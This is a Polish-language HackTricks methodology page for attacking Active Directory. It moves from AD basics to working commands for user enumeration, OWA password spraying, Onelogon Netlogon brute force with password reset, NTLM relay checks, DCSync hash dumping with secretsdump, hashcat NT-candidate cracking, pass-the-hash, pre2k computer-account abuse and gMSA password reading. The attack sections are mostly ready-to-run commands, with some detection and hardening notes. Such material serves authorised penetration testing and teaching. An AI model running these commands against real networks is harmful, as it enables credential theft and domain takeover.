# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe omówienie

**Active Directory** to podstawowa technologia, która umożliwia **administratorom sieci** sprawne tworzenie i zarządzanie **domenami**, **użytkownikami** i **obiektami** w sieci. Została zaprojektowana z myślą o skalowalności, umożliwiając organizowanie dużej liczby użytkowników w łatwe do zarządzania **grupy** i **podgrupy** oraz kontrolowanie **praw dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domen**, **drzew** i **lasów**. **Domena** obejmuje zbiór obiektów, takich jak **użytkownicy** lub **urządzenia**, korzystających ze wspólnej bazy danych. **Drzewa** to grupy domen połączonych wspólną strukturą, a **las** to zbiór wielu drzew połączonych za pomocą **relacji zaufania**, tworzący najwyższą warstwę struktury organizacyjnej. Na każdym z tych poziomów można określić konkretne **prawa dostępu** i **komunikacji**.

Kluczowe pojęcia związane z **Active Directory**:

1. **Katalog** – przechowuje wszystkie informacje dotyczące obiektów Active Directory.
2. **Obiekt** – oznacza jednostki w katalogu, w tym **użytkowników**, **grupy** lub **foldery udostępnione**.
3. **Domena** – służy jako kontener na obiekty katalogu. W obrębie jednego **lasu** może współistnieć wiele domen, z których każda ma własny zbiór obiektów.
4. **Drzewo** – grupa domen współdzielących wspólną domenę główną.
5. **Las** – najwyższy poziom struktury organizacyjnej w Active Directory, składający się z kilku drzew połączonych **relacjami zaufania**.

**Active Directory Domain Services (AD DS)** obejmuje szereg usług niezbędnych do scentralizowanego zarządzania siecią i komunikacji w jej obrębie. Należą do nich:

1. **Usługi domenowe** – centralizują przechowywanie danych i zarządzają interakcjami między **użytkownikami** a **domenami**, w tym funkcjami **uwierzytelniania** i **wyszukiwania**.
2. **Usługi certyfikatów** – zarządzają tworzeniem, dystrybucją i obsługą bezpiecznych **certyfikatów cyfrowych**.
3. **Usługi katalogowe Lightweight** – obsługują aplikacje korzystające z katalogu za pośrednictwem **protokołu LDAP**.
4. **Usługi federacyjne katalogu** – zapewniają funkcję **single sign-on**, umożliwiającą uwierzytelnianie użytkowników w wielu aplikacjach internetowych w ramach jednej sesji.
5. **Zarządzanie prawami** – pomaga chronić materiały objęte prawami autorskimi, ograniczając ich nieautoryzowane rozpowszechnianie i wykorzystywanie.
6. **Usługa DNS** – ma kluczowe znaczenie dla rozpoznawania **nazw domen**.

Bardziej szczegółowe wyjaśnienie znajdziesz tutaj: [**TechTerms - Definicja Active Directory**](https://techterms.com/definition/active_directory)

### **Uwierzytelnianie Kerberos**

Aby nauczyć się **atakować AD**, musisz dobrze **zrozumieć** proces **uwierzytelniania Kerberos**.\
[**Przeczytaj tę stronę, jeśli nadal nie wiesz, jak to działa.**](kerberos-authentication.md)

## Ściąga

Możesz zajrzeć na [https://wadcoms.github.io/](https://wadcoms.github.io), aby szybko sprawdzić, jakich poleceń możesz użyć do enumeracji lub exploitacji AD.

> [!WARNING]
> Komunikacja Kerberos zwykle **wymaga w pełni kwalifikowanej nazwy domenowej (FQDN)**, aby klient mógł uzyskać ticket dla właściwego SPN. Dostęp do maszyny za pomocą adresu IP często powoduje użycie NTLM zamiast Kerberos.

## Rekonesans Active Directory (bez creds/sessions)

Jeśli masz dostęp do środowiska AD, ale nie masz żadnych creds/sessions, możesz:

- **Przeprowadzić pentest sieci:**
  - Przeskanuj sieć, znajdź maszyny i otwarte porty, a następnie spróbuj **wykorzystać luki** lub **wyciągnąć z nich dane uwierzytelniające** (na przykład [drukarki mogą być bardzo interesującymi celami](ad-information-in-printers.md)).
  - Enumeracja DNS może ujawnić informacje o kluczowych serwerach w domenie, takich jak serwery WWW, drukarki, udziały, VPN, media itp.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Zapoznaj się z ogólną [**metodologią pentestów**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby dowiedzieć się więcej o tym, jak to zrobić.
- **Sprawdź dostęp anonimowy i Guest do usług SMB** (ta metoda nie zadziała w nowoczesnych wersjach Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Bardziej szczegółowy przewodnik po enumeracji serwera SMB znajdziesz tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Przeprowadź enumerację LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Bardziej szczegółowy przewodnik po enumeracji LDAP znajdziesz tutaj (zwróć **szczególną uwagę na dostęp anonimowy**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatruj sieć**
  - Zbierz dane uwierzytelniające, [**podszywając się pod usługi za pomocą Respondera**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Uzyskaj dostęp do hosta, [**nadużywając ataku relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Zbierz dane uwierzytelniające, **wystawiając** [**fałszywe usługi UPnP za pomocą evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Pozyskaj nazwy użytkowników i imiona oraz nazwiska z wewnętrznych dokumentów, mediów społecznościowych, usług (głównie WWW) dostępnych w środowisku domeny oraz ze źródeł publicznych.
  - Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz sprawdzić różne **konwencje nazewnictwa username (**[**przeczytaj to**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najczęstsze konwencje to: _ImięNazwisko_, _Imię.Nazwisko_, _ImiNaz_ (po 3 litery z każdego), _Imi.Naz_, _INazwisko_, _I.Nazwisko_, _NazwiskoImię_, _Nazwisko.Imię_, _NazwiskoI_, _Nazwisko.I_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
  - Narzędzia:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonimowa enumeracja SMB/LDAP:** sprawdź strony [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeracja Kerbrute**: gdy serwer otrzyma żądanie z **nieprawidłowym username**, odpowie kodem błędu **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala ustalić, że username jest nieprawidłowy. W przypadku **prawidłowych username** serwer zwróci **TGT w odpowiedzi AS-REP** albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi przejść pre-authentication.
- **Brak uwierzytelniania w MS-NRPC**: użycie poziomu uwierzytelniania = 1 (brak uwierzytelniania) w interfejsie MS-NRPC (Netlogon) na kontrolerach domeny. Metoda wywołuje funkcję `DsrGetDcNameEx2` po zbindowaniu interfejsu MS-NRPC, aby sprawdzić, czy użytkownik lub komputer istnieje, bez użycia jakichkolwiek danych uwierzytelniających. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje ten rodzaj enumeracji. Opis badań znajdziesz [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **Serwer OWA (Outlook Web Access)**

Jeśli znajdziesz w sieci jeden z takich serwerów, możesz również przeprowadzić **enumerację użytkowników**. Możesz na przykład użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Listy nazw użytkowników można znaleźć w [**tym repozytorium github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) oraz w tym repozytorium ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Warto jednak znać **imiona i nazwiska osób pracujących w firmie** — powinieneś je uzyskać podczas wcześniejszego etapu rekonesansu. Na podstawie imienia i nazwiska można użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951), aby wygenerować potencjalnie poprawne nazwy użytkowników.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Nawet po załataniu **Zerologon** na DC, konta jawnie umieszczone na liście dozwolonych nadal mogą być narażone na **starsze/podatne zachowanie bezpiecznego kanału Netlogon**. Ryzykowną konfiguracją jest GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** lub odpowiadająca mu wartość rejestru **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta wartość jest **deskryptorem zabezpieczeń SDDL** (zob. [Security Descriptors](security-descriptors.md)). Każde konto lub grupa, którym przyznano odpowiedni ACE na liście DACL, mogą być celem ataku. Na przykład `O:BAG:BAD:(A;;RC;;;WD)` skutecznie umieszcza na liście dozwolonych **Everyone**.

Praktyczny przebieg pracy operatora:

1. **Zidentyfikuj podmioty umieszczone na liście dozwolonych**, sprawdzając zarówno **SYSVOL/GPO**, jak i **rejestr działającego DC**.
2. **Rozwiąż SID-y** znalezione w SDDL do rzeczywistych użytkowników/komputerów AD i nadaj priorytet **kontom maszyn DC**, **kontom relacji zaufania** oraz innym uprzywilejowanym maszynom.
3. Wielokrotnie próbuj **uwierzytelniania MS-NRPC / Netlogon** jako konto umieszczone na liście dozwolonych.
4. Po udanym odgadnięciu wykorzystaj **ustawianie haseł Netlogon**, aby zresetować hasło konta docelowego (publiczne PoC ustawia je na pusty ciąg).<sup>[[9]](#references)[[10]](#references)</sup>

Szybka wstępna analiza / przykłady laboratoryjne z publicznego artefaktu:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notatki:

- **Scanner** jest przydatny, ponieważ efektywna lista dozwolonych może znajdować się w **SYSVOL**, w **rejestrze** lub w obu tych miejscach.
- Sama ścieżka exploita jest istotna, ponieważ po zidentyfikowaniu podatnego konta **nie wymaga uprawnień Domain Admin**.
- Przejęcie **konta komputera kontrolera domeny**, takiego jak `DC$`, jest szczególnie niebezpieczne, ponieważ zresetowanie jego hasła może bezpośrednio umożliwić dalsze ścieżki **przejęcia AD**.
- **Wykonalność brute force** zależy od trybu: publiczny materiał opisuje podejście meet-in-the-middle, **24-bitowy** brute force, gdy dostępne jest inne konto komputera, oraz wolniejsze warianty **32-bitowe**.

Uwagi dotyczące wykrywania i hardeningu:

- Przeprowadź audyt polityki listy dozwolonych i usuń z niej wszystko poza tymczasowymi, wyraźnie wymaganymi wyjątkami zgodności.
- Monitoruj zdarzenia **5827/5828/5829/5830/5831** w dzienniku **System** kontrolerów domeny, aby wykrywać odrzucane, wykryte lub jawnie dozwolone przez politykę podatne połączenia Netlogon.
- Traktuj konta na liście `VulnerableChannelAllowList` jako **wysokiego ryzyka** do czasu usunięcia zależności od starszego rozwiązania.

### Znając jedną lub kilka nazw użytkowników

OK, wiesz już, że masz prawidłową nazwę użytkownika, ale nie masz haseł... W takim razie spróbuj:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_, możesz **zażądać wiadomości AS_REP** dla tego użytkownika, która będzie zawierać dane zaszyfrowane pochodną hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Spróbujmy **najpopularniejszych haseł** dla każdego z odkrytych użytkowników — może któryś z nich używa słabego hasła (pamiętaj o polityce haseł!).
  - Pamiętaj, że możesz też przeprowadzić **spraying** na serwerach OWA, aby spróbować uzyskać dostęp do serwerów pocztowych użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Możesz być w stanie **uzyskać** pewne **hashe** challenge do złamania, zatruwając niektóre protokoły **sieciowe**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Enumeracja Active Directory dostarcza nazw użytkowników, identyfikatorów e-mail i wzorców nazewnictwa, potencjalnych hostów oraz usług, które można skłonić do uwierzytelnienia. Wykorzystaj te informacje, aby zidentyfikować możliwe [**ataki relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM i potencjalne ścieżki do środowiska AD.

### Rozpoznanie i sprawdzanie konfiguracji relay w NetExec z użyciem workspace’ów

- Użyj **workspace’ów `nxcdb`**, aby przechowywać stan rozpoznania AD oddzielnie dla każdego zlecenia: `workspace create <name>` tworzy bazy SQLite dla poszczególnych protokołów w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap itd.). Przełączaj widoki za pomocą `proto smb|mssql|winrm` i wyświetlaj zebrane sekrety poleceniem `creds`. Po zakończeniu ręcznie usuń wrażliwe dane: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Szybkie wykrywanie hostów w podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domenę**, **kompilację systemu operacyjnego**, **wymagania dotyczące podpisywania SMB** oraz **Null Auth**. Hosty członkowskie z `(signing:False)` są **podatne na relay**, natomiast kontrolery domeny często wymagają podpisywania.
- Generuj **nazwy hostów w /etc/hosts** bezpośrednio z wyników NetExec, aby ułatwić targetowanie:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Gdy **SMB relay do DC jest blokowany** przez signing, nadal sprawdź **konfigurację LDAP**: `netexec ldap <dc>` wskazuje `(signing:None)` / słabe channel binding. DC z wymaganym SMB signing, ale wyłączonym LDAP signing, nadal może być celem **relay-to-LDAP** do nadużyć takich jak **SPN-less RBCD**.

### Client-side printer credential leaks → masowa walidacja poświadczeń domenowych

- Interfejsy drukarek/web czasami **osadzają w HTML zamaskowane hasła administratora**. Wyświetlenie źródła/devtools może ujawnić tekst jawny (np. `<input value="<password>">`), umożliwiając dostęp przez Basic-auth do repozytoriów skanów/wydruków.
- Pobrane zadania drukowania mogą zawierać **dokumenty wdrożeniowe w tekście jawnym** z hasłami poszczególnych użytkowników. Zachowaj zgodność par podczas testowania:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Kradzież poświadczeń NTLM

Jeśli możesz **uzyskiwać dostęp do innych komputerów lub udziałów** jako **użytkownik null lub guest**, możesz **umieszczać pliki** (np. plik SCF), które po uzyskaniu do nich dostępu **wyzwolą uwierzytelnianie NTLM wobec Ciebie**, dzięki czemu możesz **ukraść** **wyzwanie NTLM** i spróbować je złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking i ataki NT-Candidate

**Hash shucking** traktuje każdy posiadany już hash NT jako hasło-kandydata dla innych, wolniejszych formatów, których materiał kluczowy jest bezpośrednio wyprowadzany z hasha NT. Zamiast brute-forcować długie frazy hasłowe w biletach Kerberos RC4, wyzwaniach NetNTLM lub buforowanych poświadczeniach, przekazujesz hashe NT do trybów NT-candidate w Hashcat i pozwalasz mu sprawdzić ponowne użycie hasła bez poznawania tekstu jawnego. Jest to szczególnie skuteczne po przejęciu domeny, gdy możesz zebrać tysiące bieżących i historycznych hashy NT.<sup>[[5]](#references)</sup>

Użyj shuckingu, gdy:

- Masz zbiór hashy NT z DCSync, zrzutów SAM/SECURITY lub magazynów poświadczeń i chcesz sprawdzić, czy są ponownie używane w innych domenach/lasach.
- Przechwycisz dane Kerberos oparte na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM lub bloby DCC/DCC2.
- Chcesz szybko potwierdzić ponowne użycie długich, niemożliwych do złamania fraz hasłowych i od razu wykonać pivot przez Pass-the-Hash.

Ta technika **nie działa** w przypadku typów szyfrowania, których klucze nie są hashem NT (np. Kerberos etype 17/18 AES). Jeśli domena wymusza użycie wyłącznie AES, musisz wrócić do standardowych trybów łamania haseł.

#### Tworzenie zbioru hashy NT

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby zebrać jak największy zbiór hashy NT (wraz z ich poprzednimi wartościami):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Wpisy historii znacznie zwiększają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy dla każdego konta. Więcej sposobów na pozyskanie sekretów NTDS znajdziesz tutaj:

{{#ref}}
dcsync.md
{{#endref}}

- **Zrzuty cache endpointów** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wyodrębnia lokalne dane SAM/SECURITY oraz zcache’owane logowania domenowe (DCC/DCC2). Usuń duplikaty i dodaj te hashe do tej samej listy `nt_candidates.txt`.
- **Śledź metadane** – Zachowuj nazwę użytkownika/domeny, z których pochodzi każdy hash (nawet jeśli wordlista zawiera wyłącznie wartości hex). Dopasowane hashe od razu wskażą, który principal ponownie używa hasła, gdy Hashcat wyświetli trafionego kandydata.
- Preferuj kandydatów z tego samego lasu lub z zaufanego lasu; zwiększa to szanse na dopasowanie podczas shuckingu.

#### Tryby NT-candidate w Hashcat

| Typ hasha                               | Tryb hasła | Tryb NT-candidate |
| --------------------------------------- | ---------- | ----------------- |
| Domain Cached Credentials (DCC)         | 1100       | 31500             |
| Domain Cached Credentials 2 (DCC2)      | 2100       | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS               | 5500       | 27000             |
| NetNTLMv2                               | 5600       | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth     | 7500       | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100      | 35300             |
| Kerberos 5 etype 23 AS-REP              | 18200      | 35400             |

Uwagi:

- Dane wejściowe NT-candidate **muszą pozostać surowymi hashami NT zapisanymi jako 32 znaki hex**. Wyłącz silniki reguł (bez `-r` i trybów hybrydowych), ponieważ modyfikowanie uszkadza materiał klucza kandydata.
- Te tryby nie są z natury szybsze, ale przestrzeń kluczy NTLM (~30 000 MH/s na M3 Max) jest około 100 razy szybsza niż Kerberos RC4 (~300 MH/s). Testowanie wyselekcjonowanej listy NT jest znacznie tańsze niż przeszukiwanie całej przestrzeni haseł w wolniejszym formacie.
- Zawsze używaj **najnowszej wersji Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), ponieważ tryby 31500/31600/35300/35400 dodano niedawno.<sup>[[7]](#references)</sup>
- Obecnie nie ma trybu NT dla AS-REQ Pre-Auth, a typy AES (19600/19700) wymagają hasła w postaci jawnej, ponieważ ich klucze są wyprowadzane za pomocą PBKDF2 z haseł UTF-16LE, a nie z surowych hashy NT.

#### Przykład – Kerberoast RC4 (tryb 35300)

1. Przechwyć RC4 TGS dla docelowego SPN, używając konta z niskimi uprawnieniami (szczegóły znajdziesz na stronie Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Wyłuskaj ticket za pomocą swojej listy NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat wyprowadza klucz RC4 z każdego kandydata NT i weryfikuje blob `$krb5tgs$23$...`. Dopasowanie potwierdza, że konto usługi używa jednego z posiadanych przez Ciebie hashy NT.

3. Natychmiast przejdź do PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   W razie potrzeby możesz później opcjonalnie odzyskać tekst jawny za pomocą `hashcat -m 1000 <matched_hash> wordlists/`.

#### Przykład – buforowane poświadczenia (mode 31600)

1. Zrzut buforowanych logowań z przejętej stacji roboczej:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Skopiuj linię DCC2 interesującego użytkownika domeny do `dcc2_highpriv.txt` i złam ją:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Pomyślne dopasowanie daje znany już z Twojej listy hash NT, co dowodzi, że użytkownik zapisany w cache ponownie używa tego samego hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) albo odzyskaj hasło za pomocą brute-force w szybkim trybie NTLM.

Ten sam proces dotyczy odpowiedzi na challenge NetNTLM (`-m 27000/27100`) i DCC (`-m 31500`). Po znalezieniu dopasowania możesz uruchomić relay, PtH przez SMB/WMI/WinRM lub ponownie złamać hash NT offline przy użyciu masek/reguł.



## Enumeracja Active Directory Z poświadczeniami/sesją

Na tym etapie musisz mieć **przejęte poświadczenia lub sesję prawidłowego konta domenowego.** Jeśli masz prawidłowe poświadczenia lub powłokę jako użytkownik domenowy, **pamiętaj, że przedstawione wcześniej opcje nadal pozwalają przejąć inne konta**.

Przed rozpoczęciem uwierzytelnionej enumeracji poznaj **problem Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeracja

Przejęcie konta to **ważny krok w ocenie domeny**, ponieważ umożliwia uwierzytelnioną **enumerację Active Directory**:

W przypadku [**ASREPRoast**](asreproast.md) możesz teraz znaleźć wszystkich potencjalnie podatnych użytkowników, a w przypadku [**Password Spraying**](password-spraying.md) uzyskać **listę wszystkich nazw użytkowników** i wypróbować hasło przejętego konta, puste hasła oraz nowe, obiecujące hasła.

- Możesz użyć [**CMD do przeprowadzenia podstawowego rozpoznania**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz też użyć [**powershell do rozpoznania**](../basic-powershell-for-pentesters/index.html), co będzie bardziej dyskretne
- Możesz również [**użyć powerview**](../basic-powershell-for-pentesters/powerview.md), aby uzyskać bardziej szczegółowe informacje
- Kolejnym świetnym narzędziem do rozpoznania w Active Directory jest [**BloodHound**](bloodhound.md). **Nie jest zbyt dyskretne** (zależnie od użytych metod zbierania danych), ale **jeśli Ci to nie przeszkadza**, zdecydowanie warto go wypróbować. Sprawdź, gdzie użytkownicy mogą łączyć się przez RDP, znajdź ścieżki do innych grup itp.
  - **Inne zautomatyzowane narzędzia do enumeracji AD to:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Sprawdź [**rekordy DNS domeny AD**](ad-dns-records.md), ponieważ mogą zawierać interesujące informacje.
- Do enumeracji katalogu możesz użyć **narzędzia z GUI** — **AdExplorer.exe** z pakietu **SysInternal** Suite.
- Możesz też przeszukać bazę LDAP za pomocą **ldapsearch** w poszukiwaniu poświadczeń w polach _userPassword_ i _unixUserPassword_, a także w notatkach _description_ i _info_ użytkowników. Nieopisany ciąg przypominający hasło w polu _info_ jest jedynie potencjalnym znaleziskiem: osobno potwierdź jego przeznaczenie i ważność, a podczas rutynowej enumeracji nie umieszczaj treści notatek w wynikach. Więcej metod opisano w [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Jeśli pozwala na to zakres uprawnień, sprawdź dostępne skrypty logowania do domeny i mapowania dysków w lokalizacjach `\\<dc>\NETLOGON` lub `\\<dc>\SYSVOL\<domain>\scripts`. [Dokumentacja Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) opisuje rolę udziału NETLOGON jako katalogu skryptów. Najpierw wylistuj nazwy, a następnie sprawdź tylko istotne, czytelne skrypty, nieprzekraczające ustalonego limitu rozmiaru; nie zrzucaj całego udziału ani nie wyświetlaj wartości poświadczeń podczas rutynowej enumeracji. Wywołanie PowerShell [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **nie chroni** hasła zapisanego w skrypcie jako literał. Samo wywołanie nie dowodzi, że sekret jest wpisany na stałe: prześledź rzeczywiste dane wejściowe, a następnie osobno zweryfikuj konto, ważność poświadczeń i uprawnienia. Analiza skryptu domenowego w udziale zdalnym jest odrębna od enumeracji lokalnego hosta.
- Jeśli używasz **Linux**, możesz też przeprowadzić enumerację domeny za pomocą [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz też wypróbować zautomatyzowane narzędzia, takie jak:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Wyodrębnianie wszystkich użytkowników domeny**

  W systemie Windows bardzo łatwo uzyskać wszystkie nazwy użytkowników domeny (`net user /domain` ,`Get-DomainUser` lub `wmic useraccount get name,sid`). W systemie Linux możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Choć ta sekcja dotycząca enumeracji wydaje się krótka, jest najważniejsza ze wszystkich. Otwórz linki (przede wszystkim te dotyczące cmd, powershell, powerview i BloodHound), naucz się enumerować domenę i ćwicz, aż nabierzesz wprawy. Podczas oceny będzie to kluczowy moment, który pozwoli znaleźć drogę do DA lub stwierdzić, że nie da się nic zrobić.

### Przewidywalne, wstępnie utworzone konta komputerów -> dostęp do hasła gMSA

Konta komputerów przygotowane na potrzeby starszych metod dołączania do domeny mogą zachować przewidywalne hasło początkowe. Moduł `pre2k` w NetExec wykrywa charakterystyczną wartość `userAccountControl` równą `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) i próbuje uzyskać Kerberos TGT, używając pierwszych 14 znaków nazwy komputera zapisanych małymi literami, bez końcowego `$`. Traktuj tę wartość UAC jako kryterium wyboru potencjalnych kandydatów, zamiast zakładać, że sama przynależność do **Pre-Windows 2000 Compatible Access** dowodzi słabości hasła.<sup>[[18]](#references)[[20]](#references)</sup>

Użyj uwierzytelnionej enumeracji LDAP, aby przetestować kandydatów i zapisać uzyskane TGT. `ALL=True` rozszerza testy na obiekty spoza domyślnego filtra `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Nieudany domyślny bind/NTLM **nie** unieważnia tego ustalenia: przetestuj z `-k`, używając FQDN, który rozwiązuje się do DC, i zegara zsynchronizowanego z KDC. Pomyślne uruchomienia modułu zapisują listy kandydatów i uzyskane ccaches w `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Po przejęciu principal komputera przedstaw na grafie jego zagnieżdżone członkostwa w grupach i uprawnienia wychodzące. W szczególności principals wymienione w deskryptorze zabezpieczeń `msDS-GroupMSAMembership` obiektu gMSA mogą odczytać `msDS-ManagedPassword`; wynik `--gmsa` w NetExec pokazuje dozwolone principals i zwraca bieżący hash NT, jeśli uwierzytelniający się komputer ma do tego uprawnienia.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

